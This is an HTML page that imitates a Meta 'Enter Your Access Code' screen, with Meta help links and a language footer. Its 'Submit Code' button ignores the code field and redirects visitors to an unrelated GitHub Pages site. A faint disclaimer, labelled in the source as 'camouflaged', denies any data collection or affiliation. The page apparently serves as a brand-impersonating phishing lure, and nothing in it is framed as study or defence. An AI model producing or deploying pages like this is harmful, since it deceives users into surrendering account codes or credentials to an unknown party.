<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Enter Your Access Code</title>
  <style>
    :root {
      --muted: #6b7280;
      --accent: #1d4ed8;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
      background: #ffffff;
      color: #0f172a;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 16px;
    }
    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 8px;
      font-weight: 600;
    }
    p.lead {
      color: var(--muted);
      margin-bottom: 20px;
      font-size: 15px;
    }
    .form-wrapper {
      display: flex;
      flex-direction: column;
      gap: 14px;
      align-items: center;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #d1d5db;
    }
    input[type="text"]:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.15);
    }
    button.primary {
      background: var(--accent);
      color: white;
      border: 0;
      padding: 14px 22px;
      border-radius: 9999px;
      font-weight: 600;
      cursor: pointer;
      font-size: 15px;
      width: 100%;
      max-width: 320px;
    }
    button.primary:active {
      transform: translateY(1px);
    }
    .footer {
      margin-top: 32px;
      font-size: 13px;
      color: var(--muted);
      border-top: 1px solid #e5e7eb;
      padding-top: 12px;
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .footer a {
      color: var(--accent);
      text-decoration: none;
    }
    @media (max-width: 480px) {
      h1 {
        font-size: 18px;
      }
      p.lead {
        font-size: 14px;
      }
      input[type="text"],
      button.primary {
        font-size: 14px;
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <main class="container" aria-labelledby="title">
    <h1 id="title">Enter Your Access Code</h1>
    <p class="lead">Please enter your code to continue. <a href="https://meta.com/help" target="_blank" rel="noopener">Need help?</a></p>

    <div class="form-wrapper">
      <input id="code" name="code" type="text" placeholder="Enter code" />
      <button class="primary" onclick="window.location.href='https://plextvlinks.github.io/pagema/'">
        Submit Code
      </button>
    </div>

    <div class="footer">
      <span>English (US)</span>
      <span>हिन्दी</span>
      <span>Español</span>
      <span>Português (Brasil)</span>
      <span>Français (France)</span>
      <span>Deutsch</span>
      <span><a href="#">More languages…</a></span>
      <span><a href="https://meta.com/help" target="_blank">Help Center</a></span>
    </div>

    <!-- Camouflaged One-Line Disclaimer -->
    <div style="margin: 30px auto 0; font-size: 11px; color: #9ca3af; text-align: center; max-width: 280px;">
      for informational use only. no data collected. all rights belong to respective owners. not affiliated. © 2025 mywebsite.
    </div>
  </main>
</body>
</html>
